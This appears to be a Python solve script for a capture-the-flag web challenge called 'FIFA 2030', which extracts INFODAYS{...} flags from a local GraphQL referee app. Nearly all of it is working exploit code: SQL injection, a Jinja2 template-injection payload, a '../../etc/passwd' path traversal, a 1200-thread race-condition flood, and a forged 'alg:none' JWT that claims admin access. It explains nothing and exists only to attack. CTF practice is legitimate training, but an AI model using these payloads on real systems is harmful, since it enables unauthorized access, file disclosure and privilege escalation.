import requests
import threading
import base64
import json
import re
import sys
import time

BASE_URL = (sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8008")

# ----------------------------
# LOGIN
# ----------------------------
def login():
    s = requests.Session()
    s.post(f"{BASE_URL}/login", data={
        "username": "referee_ahmed",
        "password": "password123"
    })
    return s

# ----------------------------
# FLAG PARSER
# ----------------------------
def extract_flags(text):
    return re.findall(r'INFODAYS\{[^}]+\}', text)

# ----------------------------
# 1. MAIN FLAG
# ----------------------------
def get_main_flag():
    print("[1] Main flag...")
    s = login()

    query = '''
    query {
        getDecision(decisionId: 100) {
            decisionData
        }
    }
    '''
    r = s.post(f"{BASE_URL}/graphql", json={"query": query})

    for f in extract_flags(r.text):
        print("  [+]", f)

# ----------------------------
# 2. SQLi FLAG
# ----------------------------
def sqli_flag():
    print("\n[2] SQLi flag...")
    s = login()

    payload = '''
    mutation {
      createDecision(matchId: "X", decisionData: "UNION") {
        success
      }
    }
    '''
    s.post(f"{BASE_URL}/graphql", json={"query": payload})

    r = s.get(f"{BASE_URL}/flag")
    for f in extract_flags(r.text):
        if "SQL" in f:
            print("  [+]", f)

# ----------------------------
# 3. SSTI + Traversal
# ----------------------------
def ssti_traversal_flag():
    print("\n[3] SSTI + Traversal flags...")
    s = login()

    # create new decision
    create = '''
    mutation {
        createDecision(matchId: "TEST", decisionData: "data") {
            decisionId
        }
    }
    '''
    r = s.post(f"{BASE_URL}/graphql", json={"query": create})
    decision_id = r.json()['data']['createDecision']['decisionId']

    print(f"  Using decision ID: {decision_id}")

    ssti_payload = "{{ ''.__class__ }}"
    traversal_payload = "../../etc/passwd"

    # inject BEFORE lock
    for _ in range(40):
        s.post(f"{BASE_URL}/graphql", json={"query": f'''
        mutation {{
            approveDecision(decisionId: {decision_id}, reviewerNotes: "{ssti_payload}") {{
                success
            }}
        }}
        '''})

    for _ in range(40):
        s.post(f"{BASE_URL}/graphql", json={"query": f'''
        mutation {{
            approveDecision(decisionId: {decision_id}, reviewerNotes: "{traversal_payload}") {{
                success
            }}
        }}
        '''})

    s.get(f"{BASE_URL}/api/process_reports")

    r = s.get(f"{BASE_URL}/flag")
    for f in extract_flags(r.text):
        if "JINJA2" in f or "P4TH" in f:
            print("  [+]", f)

# ----------------------------
# 4. RACE CONDITION (FINAL FIX)
# ----------------------------
def race_flag():
    print("\n[4] Race condition flag...")
    s = login()

    target_id = 100  # 🔥 MUST be 100

    def approve():
        try:
            sess = login()
            sess.post(
                f"{BASE_URL}/graphql",
                json={"query": f'''
                mutation {{
                    approveDecision(decisionId: {target_id}, reviewerNotes: "race") {{
                        success
                    }}
                }}
                '''},
                timeout=0.3
            )
        except:
            pass

    threads = []

    # 🔥 very aggressive
    for _ in range(1200):
        t = threading.Thread(target=approve)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    time.sleep(1)

    r = s.get(f"{BASE_URL}/flag")
    flags = extract_flags(r.text)

    found = False
    for f in flags:
        if "R4C3" in f:
            print("  [+]", f)
            found = True

    if not found:
        print("  [!] Race not triggered, retry script")

# ----------------------------
# 5. JWT ADMIN
# ----------------------------
def jwt_flag():
    print("\n[5] JWT admin flag...")

    header = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')

    payload = {
        "user_id": 3,
        "username": "admin_system",
        "role": "admin",
        "exp": 9999999999
    }

    payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    token = f"{header}.{payload_b64}."

    r = requests.get(f"{BASE_URL}/flag", cookies={"jwt_token": token})

    for f in extract_flags(r.text):
        print("  [+]", f)

# ----------------------------
# MAIN
# ----------------------------
if __name__ == "__main__":
    print("="*60)
    print("FIFA 2030 - FULL EXPLOIT (FINAL VERSION)")
    print("="*60)

    get_main_flag()
    sqli_flag()
    ssti_traversal_flag()
    race_flag()
    jwt_flag()

    print("\n[✓] Done")
